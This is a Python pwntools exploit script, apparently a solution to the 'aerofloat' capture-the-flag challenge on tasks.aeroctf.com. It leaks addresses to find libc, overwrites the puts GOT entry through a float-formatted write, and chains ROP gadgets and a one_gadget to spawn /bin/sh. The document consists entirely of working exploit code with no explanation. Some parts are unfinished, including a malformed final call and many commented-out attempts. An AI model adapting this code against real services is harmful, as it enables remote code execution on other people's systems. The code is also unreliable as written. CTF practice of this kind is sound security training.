#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./aerofloat"

rhp1 = {'host':"tasks.aeroctf.com",'port':33017}
rhp2 = {'host':"localhost",'port':12350}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

#onegadgets = (0x4f2c5,0x4f322,0x10a38c)
onegadgets = (0xc84da,0xe664b)

def hoge(conn,ix):
  conn.recvuntil("> ")
  conn.sendline(str(ix))

def _set(conn,_id,rating, flag=False):
  hoge(conn,1)
  conn.recvuntil("id: ")
  conn.send(_id)
  conn.recvuntil("rating: ")
  if flag==True:
    conn.send(rating)
  else:
    conn.sendline(str(rating))

def _rating_list(conn):
  hoge(conn,2)

def _profile_info(conn):
  hoge(conn,3)

def _get_id(conn,ix):
  _rating_list(conn)
  for i in range(ix):
    conn.recvuntil("Rating")
  conn.recvline()

  conn.recvuntil("Ticket: ")
  return unpack(conn.recvline().rstrip().ljust(8,'\x00'))

def exploit(conn):
  conn.recvuntil("name: ")
  conn.send("/bin/sh\x00")

  num = 0x5
  for i in range(num):
    _set(conn,'\x01',0)
  
  _set(conn,"B",0)
  dl_init = _get_id(conn,num+1)
  libc_base = dl_init - 0xd72b7d1f42#0x61aa42#0xa4742#0x401630 
  libc_base = libc_base & 0xfffffffffffff000
  onegadget = onegadgets[1] + libc_base
  print("[+]Obtained addr: "+hex(dl_init))
  print("[+]libcbase: "+hex(libc_base))
  print("[+]onegadget: "+hex(onegadget))

  for i in range(10-num):
    _set(conn,'\x01',0)
  _set(conn,p64(0xb00000001),4.0)
  #pay = struct.unpack('d',struct.pack('Q',onegadget))[0]
  #pay = str(pay).encode()+'\n'
  #pay = "{:0.330f}".format(struct.unpack('d',struct.pack('Q',onegadget))[0]) + '\n'
  #pay = p64(onegadget)+'\n'
  #_set(conn,"C"*8,pay,True)
  
  
  def kirby(addr):
    return "{:0.330f}".format(struct.unpack('d',struct.pack('Q',addr))[0]) + '\n'
  
#pay = "{:0.330f}".format(struct.unpack('d',struct.pack('Q',0x401192+1))[0]) + '\n'
  pay = kirby(0x004015bb)
  _set(conn,'\x00',pay,True)
  _set(conn,p64(binf.got["puts"]),kirby(binf.plt["puts"]),True)
  _set(conn,p64(0x401192),0)
  obtained =  _get_id(conn,14)

  
  hoge(conn,4)
  pltexit=unpack(conn.recvline().rstrip().ljust(8,'\x00'))
  print("[!]plt exit: "+hex(pltexit))
  libcbase = pltexit-0x74050#0x809c0#0x74050
  system = libcbase + 0x46ff0
  ret_gad = 0x401016
  main = 0x401192
  name = 0x4040c0
  rdi_gad = 0x4015ba
  print("[!]libc base: "+hex(libcbase))
  print("[!]onegadget: "+hex(onegadgets[0]+libcbase))

  conn.recvuntil("name: ")
  conn.send("/bin/sh\x00")
  for i in range(10):
    print(i)
    _set(conn,'\x01',0)
  _set(conn,p64(0xb004010b0),kirby(0x300000000)) #avoid corruption
  _set(conn,'\x01',1)
 
  #_set(conn,'\x01',kirby(ret_gad))
  #_set(conn,p64(rdi_gad),kirby(name))
  #_set(conn,p64(system),0)
  
  _set(conn,'\x01',kirby(onegadgets[1]+libcbase))
  _set(conn,p64(onegadgets[1]),kirby(rdi_gad))
  _set(conn,p64(name),conn,p64(system))


  


'''
  for i in range(30):
    print("*")
    _set(conn,'B',0)
  _set(conn,'B',0)

  for i in range(50):
    obtained = _get_id(conn,i+10)#-0x3e7642
    print("[!] "+hex(obtained))
'''

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

